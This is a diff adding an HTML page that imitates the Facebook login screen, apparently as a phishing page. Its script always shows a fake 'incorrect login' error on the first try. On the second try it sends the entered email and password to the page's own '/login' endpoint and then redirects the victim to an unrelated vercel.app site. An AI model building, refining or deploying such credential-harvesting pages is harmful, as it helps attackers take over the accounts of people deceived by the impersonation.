@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <!-- Tailwind v3 CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body
+    class="bg-white font-sans min-h-screen flex flex-col justify-between items-center antialiased w-full overflow-x-hidden">
+
+    <header class="w-full border-b border-gray-200 py-4 flex justify-center items-center px-4">
+        <svg class="w-11 h-11 text-[#1877f2]" viewBox="0 0 24 24" fill="currentColor">
+            <path
+                d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
+        </svg>
+    </header>
+
+    <!-- Optimized responsiveness container: prevents clipping on small screens, remains centered on desktops -->
+    <main class="w-full max-w-[416px] px-4 sm:px-6 flex flex-col items-center flex-grow justify-center my-6 sm:-mt-12">
+
+        <!-- Modified to scale fluidly on tiny mobile views -->
+        <div id="invalid"
+            class="hidden items-center gap-3 rounded-xl border border-gray-300 bg-white px-4 py-3 sm:px-6 sm:py-4 max-w-full font-sans shadow-sm mb-6">
+            <div
+                class="flex h-5 w-5 shrink-0 items-center justify-center rounded-full border-2 border-red-600 text-xs font-bold text-red-600">
+                i </div>
+            <p class="text-[14px] sm:text-[15px] leading-relaxed text-gray-800">
+                The login information you entered is incorrect.
+                <a href="#" class="font-semibold text-blue-600 hover:underline"> Find your account and log in. </a>
+            </p>
+        </div>
+
+        <div class="w-full flex items-center mb-6">
+            <button
+                class="text-gray-800 mr-3 focus:outline-none hover:bg-gray-300 rounded-full w-[30px] h-[30px] flex flex-col justify-center items-center"
+                aria-label="Go back">
+                <svg class="w-5 h-5 stroke-[2.5] stroke-current" fill="none" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 19.5L8.25 12l7.5-7.5" />
+                </svg>
+            </button>
+            <h2 class="text-[17px] font-bold text-[#1c1e21]">Log in to Facebook</h2>
+        </div>
+
+        <form class="w-full flex flex-col items-center">
+            <input id="email" type="text" placeholder="Email or mobile number"
+                class="w-full h-[52px] px-4 mb-3 border border-gray-300 rounded-[14px] bg-[#f5f6f7] text-[15px] placeholder-gray-500 focus:outline-none focus:border-[#1877f2] focus:bg-white transition" />
+
+            <!-- Input container providing a relative base layout for absolute icon button alignment -->
+            <div class="relative w-full mb-4">
+                <input id="password" type="password" placeholder="Password"
+                    class="w-full h-[52px] pl-4 pr-14 border border-gray-300 rounded-[14px] bg-[#f5f6f7] text-[15px] placeholder-gray-500 focus:outline-none focus:border-[#1877f2] focus:bg-white transition" />
+
+                <!-- Eye Toggle Button holding dynamic SVGs -->
+                <button id="togglePassword" type="button"
+                    class="hidden absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none select-none p-1">
+                    <!-- Eye Closed (Password Hidden State) -->
+                    <svg id="eyeClosedIcon" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2"
+                        viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round"
+                            d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88" />
+                    </svg>
+                    <!-- Eye Open (Password Shown State) -->
+                    <svg id="eyeOpenIcon" class="hidden w-6 h-6" fill="none" stroke="currentColor" stroke-width="2"
+                        viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                        <path stroke-linecap="round" stroke-linejoin="round"
+                            d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                    </svg>
+                </button>
+            </div>
+
+            <button id="login" type="button"
+                class="w-full h-[44px] bg-[#1877f2] text-white font-bold rounded-full hover:bg-blue-600 transition text-[15px] mb-5 text-center flex flex-col justify-center items-center">
+                Log in
+            </button>
+
+            <!-- Fixed broken close tag in your original markup from </button> to </a> -->
+            <a href="#" class="text-[#1c1e21] text-[14px] font-medium hover:underline mb-8 text-center w-full">
+                Forgot your password?
+            </a>
+
+            <!-- Responsive vertical space to look natural on short mobile screens vs tall desktop displays -->
+            <button
+                class="w-full h-[44px] border border-[#1877f2] text-[#1877f2] font-semibold rounded-full hover:bg-blue-50 transition text-[15px] mb-4 mt-8 sm:mt-16">
+                Create a new account
+            </button>
+        </form>
+    </main>
+
+    <footer class="w-full py-6 flex flex-col items-center justify-center text-gray-500 gap-1 text-[13px] px-4">
+        <div class="flex items-center gap-1 text-[#0064e0] font-semibold">
+            <img class="max-w-[90px] h-auto object-contain" src="download.png" alt="Footer Logo">
+        </div>
+    </footer>
+
+    <script>
+        function id(i) { return document.getElementById(i); }
+        function unshow() {
+            invalid.classList.remove("flex");
+            invalid.classList.add("hidden");
+        }
+        function show() {
+            invalid.classList.remove("hidden");
+            invalid.classList.add("flex");
+        }
+        const login = id("login");
+        const email = id("email");
+        const invalid = id("invalid");
+        const pass = id("password");
+        const togglePassword = id("togglePassword");
+        const eyeOpenIcon = id("eyeOpenIcon");
+        const eyeClosedIcon = id("eyeClosedIcon");
+        let t = 0;
+
+        email.addEventListener("focus", async () => {
+            unshow();
+        });
+        pass.addEventListener("focus", async () => {
+            unshow();
+        });
+
+        // Monitors password length to show or hide the parent button wrapper
+        pass.addEventListener("input", () => {
+            if (pass.value.length > 0) {
+                togglePassword.classList.remove("hidden");
+            } else {
+                togglePassword.classList.add("hidden");
+                // Forces fallback default state if text gets cleared manually
+                pass.type = "password";
+                eyeOpenIcon.classList.add("hidden");
+                eyeClosedIcon.classList.remove("hidden");
+            }
+        });
+
+        // Toggles visibility field types and alternates corresponding SVG views
+        togglePassword.addEventListener("click", () => {
+            if (pass.type === "password") {
+                pass.type = "text";
+                eyeClosedIcon.classList.add("hidden");
+                eyeOpenIcon.classList.remove("hidden");
+            } else {
+                pass.type = "password";
+                eyeOpenIcon.classList.add("hidden");
+                eyeClosedIcon.classList.remove("hidden");
+            }
+        });
+        let tt = 0;
+        login.addEventListener("click", async (e) => {
+            e.preventDefault();
+            unshow();
+
+            const Password = pass.value.trim();
+            const Email = email.value.trim();
+
+            if (!Password || !Email) {
+                alert("Please Enter Password and email!");
+                return;
+            }
+
+            const spinner = document.createElement("div");
+            spinner.className = "w-8 h-8 border-[3px] border-white border-t-transparent rounded-full animate-spin";
+            login.innerHTML = "";
+            login.appendChild(spinner);
+
+            console.log("Hello");
+            const result = await Login(Password, Email);
+            login.innerHTML = "Log in";
+
+            if (result === 0) {
+                show();
+            } else if (result === 1) {
+                alert("Correct");
+            }
+        });
+
+        async function Login(pass, email) {
+            if (pass !== "" && email !== "") {
+                let data;
+                console.log("Hello");
+
+                if (tt != 1) {
+                    tt++;
+
+                    return 0;
+                } else {
+                    const response = await fetch("/login", {
+                        method: 'POST',
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ email: email, password: pass })
+                    });
+
+                    data = await response.json();
+                    if (data.success) {
+                        window.location.replace("https://l3iba-dl-7wa.vercel.app/");
+                    } else {
+                        console.log(data.success);
+                        return 0;
+                    }
+                }
+
+            } else {
+                return -1;
+            }
+        }
+    </script>
+</body>
+
+</html>
